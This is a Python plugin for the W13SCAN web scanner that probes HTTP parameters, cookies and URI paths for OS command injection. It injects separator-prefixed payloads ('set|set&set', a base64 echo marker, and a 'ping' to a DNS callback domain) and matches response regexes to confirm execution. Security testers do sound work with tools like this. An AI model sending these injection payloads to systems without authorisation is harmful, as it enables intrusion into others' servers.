#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# @Time    : 2019/7/4 10:48 AM
# @Author  : w8ay
# @File    : command_system.py
import copy
import random
import re
from urllib.parse import quote

from lib.api.dnslog import DnsLogApi
from lib.api.reverse_api import reverseApi
from lib.core.common import generateResponse, random_str, updateJsonObjectFromStr, splitUrlPath
from lib.core.data import conf
from lib.core.enums import OS, PLACE, VulType, POST_HINT
from lib.core.plugins import PluginBase
from lib.core.settings import acceptedExt, DEFAULT_GET_POST_DELIMITER, DEFAULT_COOKIE_DELIMITER


class W13SCAN(PluginBase):
    name = '系统命令注入'
    desc = '''测试系统命令注入，支持Windows/Linux,回显型的命令注入'''

    def paramsCombination(self, data: dict, place=PLACE.GET, url_flag={}, hint=POST_HINT.NORMAL, urlsafe='/\\'):
        """
        组合dict参数,将相关类型参数组合成requests认识的,防止request将参数进行url转义

        :param data:
        :param hint:
        :return: payloads -> list
        """
        result = []
        payloads = url_flag.keys()
        for spli in ['', ';', "&&", "|"]:
            if place == PLACE.POST:
                if hint == POST_HINT.NORMAL:
                    for key, value in data.items():
                        new_data = copy.deepcopy(data)
                        for payload in payloads:
                            new_data[key] = spli + payload
                            result.append((key, value, payload, new_data, url_flag[payload]))
                elif hint == POST_HINT.JSON:
                    for payload in payloads:
                        for new_data in updateJsonObjectFromStr(data, payload):
                            result.append(('', '', payload, spli + new_data, url_flag[payload]))
            elif place == PLACE.GET:
                for payload in payloads:
                    for key in data.keys():
                        temp = ""
                        for k, v in data.items():
                            if k == key:
                                temp += "{}={}{}".format(k, quote(spli + payload, safe=urlsafe),
                                                         DEFAULT_GET_POST_DELIMITER)
                            else:
                                temp += "{}={}{}".format(k, quote(spli + v, safe=urlsafe), DEFAULT_GET_POST_DELIMITER)
                        temp = temp.rstrip(DEFAULT_GET_POST_DELIMITER)
                        result.append((key, data[key], payload, temp, url_flag[payload]))
            elif place == PLACE.COOKIE:
                for payload in payloads:
                    for key in data.keys():
                        temp = ""
                        for k, v in data.items():
                            if k == key:
                                temp += "{}={}{}".format(k, quote(spli + payload, safe=urlsafe),
                                                         DEFAULT_COOKIE_DELIMITER)
                            else:
                                temp += "{}={}{}".format(k, quote(spli + v, safe=urlsafe), DEFAULT_COOKIE_DELIMITER)
                        result.append((key, data[key], payload, temp, url_flag[payload]))
            elif place == PLACE.URI:
                uris = splitUrlPath(data, flag="<--flag-->")
                for payload in payloads:
                    for uri in uris:
                        uri = uri.replace("<--flag-->", payload)
                        result.append(("", "", payload, uri, url_flag[payload]))
        return result

    def audit(self):
        url = self.requests.url

        if self.requests.suffix not in acceptedExt and conf.level < 4:
            return

        randint = random.randint(1000, 9000)
        url_flag = {
            "set|set&set": [
                'Path=[\s\S]*?PWD=',
                'Path=[\s\S]*?PATHEXT=',
                'Path=[\s\S]*?SHELL=',
                'Path\x3d[\s\S]*?PWD\x3d',
                'Path\x3d[\s\S]*?PATHEXT\x3d',
                'Path\x3d[\s\S]*?SHELL\x3d',
                'SERVER_SIGNATURE=[\s\S]*?SERVER_SOFTWARE=',
                'SERVER_SIGNATURE\x3d[\s\S]*?SERVER_SOFTWARE\x3d',
                'Non-authoritative\sanswer:\s+Name:\s*',
                'Server:\s*.*?\nAddress:\s*'
            ],
            "echo `echo 6162983|base64`6162983".format(randint): [
                "NjE2Mjk4Mwo=6162983"
            ]
        }
        if OS.WINDOWS in self.response.os:
            del url_flag["echo `echo 6162983|base64`6162983".format(randint)]

        # 无回显 payload
        # dnslog = DnsLogApi()
        # dnsdomain = dnslog.new_domain()
        # token = random_str(4)
        # dnslog_payload = "ping -nc 1 {}.{}".format(token, dnsdomain)
        # url_flag[dnslog_payload] = []

        # 内置平台 dns payload
        dns = reverseApi()
        if dns.isUseReverse():
            dnsdomain = dns.generate_dns_token()
            dns_token = dnsdomain["token"]
            fullname = dnsdomain["fullname"]
            reverse_payload = "ping -nc 1 {}".format(fullname)
            url_flag[reverse_payload] = []

        iterdatas = self.generateItemdatas()
        for origin_dict, positon in iterdatas:
            payloads = self.paramsCombination(origin_dict, positon, url_flag)
            for key, value, new_value, payload, re_list in payloads:
                r = self.req(positon, payload)
                if not r:
                    continue
                html1 = r.text
                for rule in re_list:
                    if re.search(rule, html1, re.I | re.S | re.M):
                        result = self.new_result()
                        result.init_info(url, "可执行任意系统命令", VulType.CMD_INNJECTION)
                        result.add_detail("payload请求", r.reqinfo, generateResponse(r),
                                          "执行payload:{} 并发现正则回显{}".format(new_value, rule), key, new_value, positon)
                        self.success(result)
                        break
                # if dnslog_payload in new_value:
                #     dnslist = dnslog.check()
                #     if dnslist:
                #         result = self.new_result()
                #         result.init_info(url, "可执行任意系统命令", VulType.CMD_INNJECTION)
                #         result.add_detail("payload请求", r.reqinfo, generateResponse(r),
                #                           "执行payload:{} dnslog平台接收到返回值".format(payload, repr(dnslist)), key,
                #                           new_value,
                #                           positon)
                #         self.success(result)
                #         break

                if dns.isUseReverse():
                    dnslist = dns.check(dns_token)
                    if dnslist:
                        result = self.new_result()
                        result.init_info(url, "可执行任意系统命令", VulType.CMD_INNJECTION)
                        result.add_detail("payload请求", r.reqinfo, generateResponse(r),
                                          "执行payload:{} dnslog平台接收到返回值".format(payload, repr(dnslist)), key,
                                          new_value,
                                          positon)
                        self.success(result)
                        break
